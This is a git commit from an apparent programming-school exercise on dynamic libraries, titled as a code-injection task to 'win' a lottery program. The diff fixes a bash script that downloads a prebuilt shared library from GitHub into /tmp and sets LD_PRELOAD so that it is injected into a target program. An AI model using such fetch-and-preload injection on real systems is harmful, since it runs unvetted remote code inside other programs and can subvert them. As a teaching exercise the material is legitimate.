e9010663f48c06f77fba2a10379d205dcd46d36d
Mohabdo21 <mohannadabdo21@hotmail.com>
2023-11-14 04:22:39 +0400

    3. Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp https://raw.githubusercontent.com/Mohabdo21/test/main/libwin.so
+wget -P /tmp https://raw.githubusercontent.com/Mohabdo21/test/main/libwin.so
 export LD_PRELOAD="/tmp/libwin.so"
